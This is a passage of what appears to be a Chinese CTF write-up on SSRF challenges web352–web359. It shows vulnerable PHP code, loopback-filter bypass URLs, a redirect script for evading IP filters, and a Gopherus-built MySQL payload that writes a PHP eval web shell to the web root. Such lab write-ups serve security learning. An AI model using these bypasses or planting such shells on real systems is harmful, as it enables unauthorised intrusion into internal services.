class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>协议必须是 http/https ，但过滤了 localhost 和 127.0.0</p><p>poc</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>preg_match 没传参可还行。。因为有 <code>error_reporting(0)</code> ，报错的地方恒为 <code>False</code>…</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687502281-623a00b3-dea2-4ba0-aad8-670551a0adc4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687502281-623a00b3-dea2-4ba0-aad8-670551a0adc4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web353-数字绕过"><a href="#web353-数字绕过" class="headerlink" title="web353 数字绕过"></a>web353 数字绕过</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>协议必须是 http/https ，但过滤了 localhost 和 127.0.</p><p>这里有许多绕过</p><ul><li>进制绕过</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure><ul><li>0.0.0.0 绕过</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><ul><li>ipv6绕过 这里不行</li><li>特殊地址绕过</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://127.0000000000000.001/flag.php</span><br></pre></td></tr></table></figure><p>这里有个小知识点</p><p>第一个 0 在linux系统中一般会解析成127.0.0.1 ，在windows 和 macos 中一般解析成0.0.0.0</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687776689-331d0512-b6ec-428d-ba38-f578dcc3d472.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687776689-331d0512-b6ec-428d-ba38-f578dcc3d472.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web354-难点的数字绕过"><a href="#web354-难点的数字绕过" class="headerlink" title="web354 难点的数字绕过"></a>web354 难点的数字绕过</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>了解到一个好玩的东西 <code>IDNA</code> ，不过这题用不上</p><p><a href="https://www.tr0y.wang/2020/08/18/IDN/">https://www.tr0y.wang/2020/08/18/IDN/</a></p><p>然后又了解到一个有趣的东西， 有免费的 <code>http://sudo.cc/</code> 可以解析到 <code>127.0.0.1</code> 白嫖。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617689750925-02749ca5-8401-4a6c-80d0-985a7ae52fba.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617689750925-02749ca5-8401-4a6c-80d0-985a7ae52fba.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>题外：</p><p>虽然也可以用自己的域名或服务器，2333</p><h2 id="web355-长度限制"><a href="#web355-长度限制" class="headerlink" title="web355 长度限制"></a>web355 长度限制</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>主机名部分长度限制，可以用 <code>http://0/flag.php</code> 也可以用 <code>http://127.1/flag.php</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619319893905-9fd4c027-5875-429c-9667-abbf5e164392.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619319893905-9fd4c027-5875-429c-9667-abbf5e164392.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web356-长度限制"><a href="#web356-长度限制" class="headerlink" title="web356 长度限制"></a>web356 长度限制</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>同 web255，只不过短了点</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619320437184-bc295661-c42b-42f6-89e0-eb1d3c1e6497.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619320437184-bc295661-c42b-42f6-89e0-eb1d3c1e6497.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web357-IP过滤器"><a href="#web357-IP过滤器" class="headerlink" title="web357 IP过滤器"></a>web357 IP过滤器</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = gethostbyname(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!filter_var(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>先获取主机名对应的ip，然后用IP过滤器进行过滤</p><ul><li>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</li><li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</li></ul><p>即，主机名解析的 IP 不能是保留地址或者是内网 IP。</p><p>这时利用公网服务器进行重定向即可，为了以后的题目 fuzz 方便，写好参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$h_p_p</span> = explode(<span class="string">&quot;@&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$h_p_p</span>[<span class="number">0</span>] <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$h_p_p</span>[<span class="number">1</span>] <span class="keyword">or</span> <span class="string">&#x27;80&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$h_p_p</span>[<span class="number">2</span>] <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">header(<span class="string">&quot;Location: http://<span class="subst">$host</span>:<span class="subst">$port</span>/<span class="subst">$path</span>&quot;</span>, <span class="literal">TRUE</span>, <span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619322657727-06fce0c5-989d-4a94-8183-42084399e9da.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619322657727-06fce0c5-989d-4a94-8183-42084399e9da.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web358-白名单正则"><a href="#web358-白名单正则" class="headerlink" title="web358 白名单正则"></a>web358 白名单正则</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析，</p><p>之前一直没分析到这个 <code>parse_url</code> 函数的特性，有些时候有的时候 URL 会长这样</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323550261-1856f9f8-fcfa-4beb-b3cc-d108282f319f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323550261-1856f9f8-fcfa-4beb-b3cc-d108282f319f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>解析时，会把@进行分割，前面是用户，后面是主机名。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323676559-da7b2c5e-97d3-4169-b4ca-901b68a1e749.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323676559-da7b2c5e-97d3-4169-b4ca-901b68a1e749.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web359-打无密码MySQL"><a href="#web359-打无密码MySQL" class="headerlink" title="web359 打无密码MySQL"></a>web359 打无密码MySQL</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><p>题目提示</p><blockquote><p>打无密码的mysql</p><p>为什么是无密码呢？</p><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行，本文利用SSRF漏洞攻击MySQL也是在其未授权情况下进行的。</p></blockquote><p>随便写点东西 Login 一下，然后有个 <code>returl</code> 写个 baidu，发现可以请求 baidu</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619324137797-1e83cc1d-d7c6-4a7f-8d3f-bdd7ee83def4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619324137797-1e83cc1d-d7c6-4a7f-8d3f-bdd7ee83def4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>一般 SSRF 打内网应用主要还是通过协议，比如用的比较多的是 gopher</p><p>具体怎么做呢？</p><p>细心的同学可能发现，无论是用 gopher 攻击 redis、mysql、还是 ftp，这些主要都是基于 tcp 协议为主。这和 gopher 协议的基本格式有关</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>因为，如果想要打 MySQL 就需要知道 MySQL 通信时的 TCP 数据流，才能知道要怎么和 MySQL 通信，这里可以通过 Wireshark 抓包来分析</p><p>可以参考下面链接的 0x02 mysql协议分析部分</p><p><a href="https://www.freebuf.com/articles/web/159342.html">https://www.freebuf.com/articles/web/159342.html</a></p><p>不过这里有个更好用的工具</p><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>他包含常见的应用 gopher 数据包的格式构造， 原理也是通过 Wireshark 抓包分析，然后写脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p>依次输入用户和要执行的SQL语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select <span class="string">&#x27;&lt;?php eval($_GET[c]);?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/c.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335107292-3c92991d-dada-496f-8b43-14be5a4e8eef.png?x-oss-process=image/resize,w_1500" class="lazyload" 